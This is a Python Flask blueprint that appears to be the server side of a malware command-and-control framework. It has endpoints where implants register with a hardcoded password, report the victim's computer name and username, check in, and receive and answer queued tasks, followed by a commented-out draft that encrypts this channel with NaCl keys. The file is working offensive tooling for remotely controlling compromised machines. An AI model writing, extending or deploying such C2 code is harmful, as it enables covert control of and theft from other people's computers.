# rpc blueprint - Implant <--> Server

from flask import Blueprint, request , abort  # type: ignore

from cvnt.implant_pb2 import * 

from flask_wtf.csrf import * # type: ignore

from cvnt.db_operations import *

from cvnt.constants import *

from nacl.public import PrivateKey, PublicKey
from nacl.encoding import HexEncoder

# Generate public private key pair
server_private_key = PrivateKey.generate()
server_public_key = server_private_key.public_key

# Encode the public key in hexadecimal format for easy embedding or display
encoded_public_key = server_public_key.encode(encoder=HexEncoder).decode('utf-8')
print(encoded_public_key)


rpc = Blueprint("rpc", __name__)

PASSWORD = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"

@rpc.route("/register", methods=["POST"])
def handle_register():

    ip = request.remote_addr
    reg_data = request.get_data()
    register = RegisterImplant()
    register.ParseFromString(reg_data)
    print(f'[+] New Implant: from {request.remote_addr}')
    print(f'[+]    * ImplantID: {register.ImplantID}')
    print(f'[+]    * ComputerName: {register.ComputerName}')
    print(f'[+]    * Username: {register.Username}')
    print(f'[+]    * Password: {register.Password}')

    if register.Password != PASSWORD:
        abort(404)

    r = register_implant(make_implant(register, ip))

    print("[+] Watch out sexy ;) a New Implant connected!")

    return SUCCESSFUL

@rpc.route("/checkin", methods=["POST"])
def checkin():
    reg_data = request.get_data()
    ic = ImplantCheckin()
    ic.ParseFromString(reg_data)
    print(f'[+] Implant [{ic.ImplantID}] is checking in.')
    print(f'[+] --> TaskResponse = [{ic.Resp}]')

    update_implant_last_seen(ic.ImplantID) 
    
    # Send TaskRequest back or "" (if failed to analyze or no remaining tasks)
    if analyze_TaskResponse(ic.Resp):
        return get_next_task(ic.ImplantID)
    return ""

@rpc.route("/task/request", methods=["POST"])
def send_task():
    try:
        task_request = TaskRequest()
        task_request.ParseFromString(request.get_data())
        
        # Assuming the TaskRequest contains implant_id and other necessary details
        implant = Implant.query.get(task_request.implant_id)
        if not implant:
            return "Implant not found", 404
        
        # Create a new task entry
        new_task = make_task(
            id=None,
            task_id=task_request.task_id,
            status="created",
            implant_id=implant.id,
            task_opcode=task_request.opcode,
            task_args=task_request.args
        )
        db.session.add(new_task)
        db.session.commit()
        
        print(f"Task {new_task.task_id} sent to implant {implant.id}")
        return f"Task sent to implant {implant.id}", 200
    except Exception as e:
        print(f"Error sending task: {e}")
        return str(e), 500


@rpc.route("/task/response", methods=["POST"])
def receive_task_response():
    try:
        task_response = TaskResponse()
        task_response.ParseFromString(request.get_data())
        # Update the task status based on the response
        task = Task.query.filter_by(task_id=task_response.task_guid).first()
        if not task:
            return "Task not found", 404
        
        task.status = STATUS_TASK_COMPLETE if task_response.response else STATUS_TASK_FAILED
        db.session.commit()
        
        print(f"Received response for task {task.task_id} from implant {task.implant_id}")
        return f"Response received for task {task.task_id}", 200
    except Exception as e:
        print(f"Error receiving task response: {e}")
        return str(e), 500
    

# from flask import Blueprint, request, abort, jsonify
# from nacl.public import PrivateKey, PublicKey, Box
# from nacl.encoding import HexEncoder
# from nacl.secret import SecretBox
# from nacl.utils import random as nacl_random
# from cvnt.implant_pb2 import RegisterImplant, TaskRequest, TaskResponse
# from cvnt.database import db
# from cvnt.models import Implant, Task
# from flask import Blueprint, request , abort 
# from cvnt.implant_pb2 import * 
# from cvnt.database import db
# from cvnt.models import *

# from flask_wtf.csrf import *

# rpc = Blueprint("rpc", __name__)

# password = "password"

# # Generate server keys (or load them)
# server_private_key = PrivateKey.generate()
# server_public_key = server_private_key.public_key

# #each "box" is where each implant which have its respective private public key pairs stuff and the server stuff
# #encryprion and decryption is done here
# def retrieve_box_for_implant(implant_id):
#     # Assuming you have a way to get the implant's public key
#     implant = Implant.query.get(implant_id)
#     if not implant:
#         return None

#     client_public_key = PublicKey(implant.public_key, encoder=HexEncoder)
#     box = Box(server_private_key, client_public_key)
#     return box


# @rpc.route("/register", methods=["POST"])
# def handle_register():
#     try:
#         reg_data = request.get_data()
#         register = RegisterImplant(reg_data)
#         register_request = register.ParseFromString(reg_data)

    
#         if register.Password != password:
#             abort(404)

#         # Assuming the public key is sent as a hex in register_request
#         client_public_key = PublicKey(register_request.public_key, encoder=HexEncoder)
        
#         # Create a box to encrypt/decrypt messages
#         box = Box(server_private_key, client_public_key)
        
#         # store the box
#         new_implant = Implant(public_key=register_request.public_key)  # example model attribute
#         db.session.add(box)
#         db.session.commit()

#         # Prepare and send the server public key
#         response = RegisterImplant(public_key=server_public_key.encode(encoder=HexEncoder))
#         return response.SerializeToString(), 200
#     except Exception as e:
#         print(f"Registration failed: {e}")
#         abort(400)

# @rpc.route("/task/request", methods=["POST"])
# def send_task():
#     try:
#         task_request = TaskRequest()
#         task_request.ParseFromString(request.get_data())
        
#         # Assuming the TaskRequest contains implant_id and other necessary details
#         implant = Implant.query.get(task_request.implant_id)
#         if not implant:
#             return "Implant not found", 404
        
#         # Decrypt and process task request here using the stored session key (the box basically)
#         box = retrieve_box_for_implant(task_request.implant_id)
        
#         # Decrypt data
#         decrypted_data = box.decrypt(task_request.encrypted_data)
        
#         # Create a new task entry
#         new_task = make_task(
#             id=None,
#             task_id=task_request.task_id,
#             status="created",
#             implant_id=implant.id,
#             task_opcode=task_request.opcode,
#             task_args=task_request.args
#         )
#         db.session.add(decrypted_data)
#         db.session.commit()
        
#         print(f"Task {new_task.task_id} sent to implant {implant.id}")
#         return f"Task sent to implant {implant.id}", 200
#     except Exception as e:
#         print(f"Error sending task: {e}")
#         return str(e), 500


# @rpc.route("/task/response", methods=["POST"])
# def receive_task_response():
#     try:
#         response_data = request.get_data()
#         task_response = TaskResponse.FromString(response_data)

#         # Retrieve the implant's box to decrypt the data
#         box = retrieve_box_for_implant(task_response.implant_id)
#         if not box:
#             abort(404, 'No cryptographic context found for the implant')

#         # Decrypt data
#         decrypted_data = box.decrypt(task_response.encrypted_data)

#         # Process decrypted data and update the task status in the database
#         task = Task.query.filter_by(task_id=task_response.task_id).first()
#         if not task:
#             return "Task not found", 404

#         task.status = decrypted_data.status  # Assuming the decrypted data contains status
#         db.session.commit()

#         task.status = STATUS_TASK_COMPLETE if decrypted_data.response else STATUS_TASK_FAILED #fix this
#         db.session.commit()

#         return "Response received and processed successfully", 200
#     except Exception as e:
#         print(f"Error receiving task response: {e}")
#         return str(e), 500
    


    


        




